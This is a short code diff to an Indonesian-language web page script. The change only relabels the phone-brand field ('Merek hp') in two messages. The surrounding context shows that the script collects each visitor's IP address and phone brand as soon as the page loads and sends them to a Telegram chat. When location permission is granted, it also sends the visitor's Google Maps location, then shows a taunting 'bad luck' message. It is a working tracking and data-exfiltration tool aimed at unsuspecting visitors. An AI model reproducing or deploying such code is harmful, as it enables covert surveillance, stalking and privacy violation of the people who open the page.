@@ -44,7 +44,7 @@
   (async () => {
     const ip = await getIP();
     const merek = getMerekHP();
-    const pesanAwal = `IP berhasil ditemukan!\nStatus: MENUNGGU IZIN LOKASI\nIP: ${ip}\nMerek: ${merek}`;
+    const pesanAwal = `IP berhasil ditemukan!\nStatus: MENUNGGU IZIN LOKASI\nIP: ${ip}\nMerek hp: ${merek}`;
     await kirimPesanTelegram(pesanAwal);
   })();
 
@@ -56,7 +56,7 @@
       const ip = await getIP();
       const merek = getMerekHP();
 
-      const pesan = `IP berhasil ditemukan!\nStatus: MENGIZINKAN LOKASI\nIP: ${ip}\nMerek: ${merek}\nLokasi: ${gmaps}`;
+      const pesan = `IP berhasil ditemukan!\nStatus: MENGIZINKAN LOKASI\nIP: ${ip}\nMerek hp: ${merek}\nLokasi: ${gmaps}`;
       await kirimPesanTelegram(pesan);
 
       document.body.innerHTML = '<h2>Yahh kurang hoki bro wkwk.<br><small>by Vinzz Official</small></h2>';
